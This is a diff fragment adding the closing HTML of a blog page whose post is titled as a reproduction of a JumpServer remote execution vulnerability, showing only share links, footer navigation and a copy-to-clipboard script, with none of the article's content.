+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&text=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&is_video=false&description=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JumpServer远程执行漏洞复现&body=Check out this article: http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&name=JumpServer远程执行漏洞复现&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&t=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
